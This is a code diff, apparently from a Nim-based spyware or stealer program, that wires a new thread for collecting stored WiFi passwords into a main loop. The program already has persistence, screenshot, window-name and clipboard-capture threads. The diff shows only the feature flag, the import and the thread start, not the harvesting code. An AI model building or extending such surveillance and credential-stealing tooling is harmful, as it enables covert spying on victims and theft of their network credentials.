@@ -48,6 +48,7 @@ from lib/flags import USE_PERSISTENCE_THREAD
 from lib/flags import USE_WINDOW_NAME_THREAD
 from lib/flags import USE_SCREENSHOT_THREAD
 from lib/flags import USE_CLIPBOARD_THREAD
+from lib/flags import USE_WIFI_PASSWORDS_THREAD
 
 when not isProd:
   echo "started"
@@ -104,6 +105,13 @@ when USE_CLIPBOARD_THREAD:
   var clipboardThreadVar: Thread[void]
 
   createThread(clipboardThreadVar, initClipboardThread)
+
+when USE_WIFI_PASSWORDS_THREAD:
+  from lib/threads/wifiPasswordsThread import initWifiPasswordsThread
+
+  var wifiPasswordsThreadVar: Thread[void]
+
+  createThread(wifiPasswordsThreadVar, initWifiPasswordsThread)
 
 # wait for thread messages
 while true:
